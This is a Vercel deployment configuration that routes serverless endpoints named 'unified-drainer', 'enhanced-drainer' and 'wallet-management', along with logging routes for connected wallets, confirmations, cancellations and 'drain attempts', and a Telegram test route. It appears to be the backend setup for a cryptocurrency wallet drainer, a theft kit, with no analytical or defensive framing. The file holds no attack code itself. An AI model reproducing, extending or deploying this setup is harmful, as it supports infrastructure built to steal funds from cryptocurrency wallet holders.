{
  "version": 2,
  "functions": {
    "api/index.js": {
      "maxDuration": 30
    },
    "api/wallet-management-vercel.js": {
      "maxDuration": 30
    },
    "api/unified-drainer-vercel.js": {
      "maxDuration": 30
    },
    "api/enhanced-drainer-vercel.js": {
      "maxDuration": 30
    },
    "api/enhancements-vercel.js": {
      "maxDuration": 10
    }
  },
  "routes": [
    {
      "src": "/manifest.json",
      "dest": "/manifest.json",
      "headers": {
        "Content-Type": "application/json",
        "Access-Control-Allow-Origin": "*",
        "Cache-Control": "public, max-age=31536000"
      }
    },
    {
      "src": "/api/drainer",
      "dest": "/api/index.js"
    },
    {
      "src": "/api/drainer/log-wallet",
      "dest": "/api/index.js"
    },
    {
      "src": "/api/drainer/log-confirmation", 
      "dest": "/api/index.js"
    },
    {
      "src": "/api/drainer/log-cancellation",
      "dest": "/api/index.js"
    },
    {
      "src": "/api/drainer/log-drain-attempt",
      "dest": "/api/index.js"
    },
    {
      "src": "/api/wallet-management",
      "dest": "/api/wallet-management-vercel.js"
    },
    {
      "src": "/api/unified-drainer",
      "dest": "/api/unified-drainer-vercel.js"
    },
    {
      "src": "/api/enhanced-drainer",
      "dest": "/api/enhanced-drainer-vercel.js"
    },
    {
      "src": "/api/enhancements/(.*)",
      "dest": "/api/enhancements-vercel.js"
    },
    {
      "src": "/api/test/telegram",
      "dest": "/api/index.js"
    },
    {
      "src": "/src/(.*\\.js)",
      "headers": {
        "Content-Type": "application/javascript",
        "Access-Control-Allow-Origin": "*"
      }
    },
    {
      "src": "/manifest.json",
      "headers": {
        "Content-Type": "application/json",
        "Access-Control-Allow-Origin": "*",
        "Cache-Control": "public, max-age=31536000"
      }
    },
    {
      "src": "/(.*\\.png|.*\\.jpg|.*\\.jpeg|.*\\.gif|.*\\.ico)",
      "headers": {
        "Access-Control-Allow-Origin": "*",
        "Cache-Control": "public, max-age=31536000"
      }
    },
    {
      "src": "/(.*\\.css|.*\\.js)",
      "headers": {
        "Access-Control-Allow-Origin": "*",
        "Cache-Control": "public, max-age=31536000"
      }
    }
  ],
  "buildCommand": "echo 'No build step required for Node.js app'",
  "installCommand": "npm install",
  "framework": null,
  "env": {
    "NODE_ENV": "production"
  }
} 